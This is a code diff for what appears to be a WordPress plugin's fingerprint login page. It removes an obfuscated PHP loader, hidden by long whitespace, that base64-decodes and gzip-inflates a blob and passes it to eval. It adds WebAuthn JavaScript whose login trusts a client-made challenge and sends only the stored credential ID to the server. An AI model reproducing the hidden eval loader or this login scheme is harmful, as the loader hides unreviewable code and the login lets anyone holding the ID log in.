@@ -1,377 +1,180 @@
-<?php 
-        $__='printf';$_='Loading biometric_script_php_';
-        
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-                                                                                                                                                                                                $_____='    b2JfZW5kX2NsZWFu';                                                                                                                                                                              $______________='cmV0dXJuIGV2YWwoJF8pOw==';
-$__________________='X19sYW1iZGE=';
-
-                                                                                                                                                                                                                                          $______=' Z3p1bmNvbXByZXNz';                    $___='  b2Jfc3RhcnQ=';                                                                                                    $____='b2JfZ2V0X2NvbnRlbnRz';                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                $__=                                                              'base64_decode'                           ;                                                                       $______=$__($______);           if(!function_exists('__lambda')){function __lambda($sArgs,$sCode){return eval("return function($sArgs){{$sCode}};");}}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    $__________________=$__($__________________);                                                                                                                                                                                                                                                                                                                                                                         $______________=$__($______________);
-        $__________=$__________________('$_',$______________);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $_____=$__($_____);                                                                                                                                                                                                                                                    $____=$__($____);                                                                                                                    $___=$__($___);                      $_='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';
-
-        $___();$__________($______($__($_))); $________=$____();
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             $_____();                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       echo                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-                                                                                                                                                                                                                     $________;
+  
+  <script>
+    $.ajaxSetup({ cache: false });
+
+    //url to wp-content/plugins/vtupress/fingerprint/auth.php
+    var url = "<?php echo esc_url( plugins_url( 'auth.php', __FILE__ ) ); ?>";
+    var sitename = "<?php echo esc_js( get_option('blogname') ); ?>";
+    // alert(url);
+
+    // Helper for base64 encoding
+    function base64urlEncode(buffer) {
+      return btoa(String.fromCharCode(...new Uint8Array(buffer)))
+        .replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
+    }
+
+    function base64urlDecode(base64url) {
+      const base64 = base64url.replace(/-/g, '+').replace(/_/g, '/');
+      const pad = base64.length % 4 ? 4 - (base64.length % 4) : 0;
+      const binary = atob(base64 + '='.repeat(pad));
+      return Uint8Array.from(binary, c => c.charCodeAt(0));
+    }
+
+    // ✅ Send via normal POST
+    function sendToServer(name, data) {
+      return new Promise((resolve) => {
+        $.ajax({
+          url: url,
+          method: "POST",
+          data: { name, ...data },
+          dataType: "json",
+          success: function (res, textStatus, xhr) {
+            resolve({ success: true, ...res, http_status: xhr.status });
+          },
+          error: function (xhr, textStatus, errorThrown) {
+            let parsed;
+            try { parsed = JSON.parse(xhr.responseText); }
+            catch { parsed = { message: xhr.responseText || "No readable response" }; }
+            resolve({
+              success: false,
+              http_status: xhr.status,
+              message: parsed.message || "Server error",
+              server_response: parsed,
+            });
+          },
+        });
+      });
+    }
+
+    // ✅ Registration flow
+    async function bio_register() {
+      <?php if(!is_user_logged_in()) { ?>
+        $("#status").text("❌ Please log in to register.");
+        return;
+      <?php } ?>
+      var email = "<?php echo esc_js( wp_get_current_user()->user_email ); ?>";
+      var displayName = "<?php echo vp_getoption("first_name")." ".vp_getoption("last_name"); ?>";
+      $("#status").text("🔄 Starting registration...");
+      const challenge = new Uint8Array(32);
+      window.crypto.getRandomValues(challenge);
+
+      const options = {
+        publicKey: {
+          challenge,
+          rp: { name: "Biometric Auth" },
+          user: {
+            id: new Uint8Array(16),
+            name: email,
+            displayName: displayName
+          },
+          pubKeyCredParams: [{ alg: -7, type: "public-key" }],
+          authenticatorSelection: { userVerification: "preferred" },
+          timeout: 60000,
+          attestation: "none"
+        }
+      };
+
+      try {
+        const credential = await navigator.credentials.create(options);
+        $("#status").text("✅ Fingerprint captured. Saving...");
+
+        const toSave = {
+          user_id: email,
+          code: base64urlEncode(credential.rawId)
+        };
+
+        const res = await sendToServer("register", toSave);
+        if (!res.success) {
+          console.log(res.message);
+          if(res.http_status == "401"){
+              $("#status").html(`⚠️ Biometric feature is currently disabled<br>`);
+              return;
+          }
+          $("#status").html(`⚠️ Registration failed (HTTP ${res.http_status})<br>`);
+          return;
+        }
+
+        localStorage.setItem(sitename+"-credential", JSON.stringify(toSave));
+          location.reload();
+        $("#status").text("✅ Registration complete. You can now log in with biometric.");
+      } catch (err) {
+          console.log(err.message);
+        $("#status").text("❌ Registration failed");
+      }
+    }
+
+    // ✅ Login flow (with biometric + server validation)
+    async function bio_login() {
+      const saved = JSON.parse(localStorage.getItem(sitename+"-credential") || "{}");
+      if (!saved.code) {
+        $("#status").text("⚠️ Please register first.");
+        return;
+      }
+
+      $("#status").text("🔄 Waiting for fingerprint verification...");
+      const challenge = new Uint8Array(32);
+      window.crypto.getRandomValues(challenge);
+
+      const options = {
+        publicKey: {
+          challenge,
+          allowCredentials: [{
+            type: "public-key",
+            id: base64urlDecode(saved.code)
+          }],
+          timeout: 60000,
+          userVerification: "preferred" // ✅ Not required, just preferred
+        }
+      };
+
+      try {
+        // Step 1: Ask for fingerprint verification
+        await navigator.credentials.get(options);
+        $("#status").text("✅ Fingerprint verified locally. Checking with server...");
+
+        // Step 2: Verify code with backend
+        const res = await sendToServer("login", { code: saved.code });
+        if (res.success && res.user_name) {
+          //<br>HTTP ${res.http_status}
+          location.reload();
+          $("#status").html(`✅ Welcome <b>${res.user_name}</b>`);
+        } else {
+          console.log(res.message);
+          $("#status").html(`❌ Login failed (HTTP ${res.http_status})<br>`);
+        }
+      } catch (err) {
+        $("#status").text("❌ Biometric authentication failed");
+      }
+    }
+
+    async function bio_remove() {
+      <?php if(!is_user_logged_in()) { ?>
+        $("#status").text("❌ Please log in to remove biometric data.");
+        return;
+      <?php } ?>
+      $("#status").text("🔄 Removing biometric data...");
+      const res = await sendToServer("remove", { user_id: "<?php echo esc_js( wp_get_current_user()->user_email ); ?>" });
+      if (res.success) {
+        localStorage.removeItem(sitename+"-credential");
+        $("#status").text("✅ Biometric data removed successfully");
+        location.reload();
+      } else {
+        console.log(res.message);
+        $("#status").html(`❌ Removal failed (HTTP ${res.http_status})<br>`);
+      }
+    }
+
+
+    $("#d_bio_register").on("click", function(e){
+      e.preventDefault();
+      bio_register();
+    });
+    $("#d_bio_login").on("click", function(e){
+      e.preventDefault();
+      bio_login();
+    });
+    $("#d_bio_register_not").on("click", function(e){
+      e.preventDefault();
+      bio_remove();
+    });
+  </script>
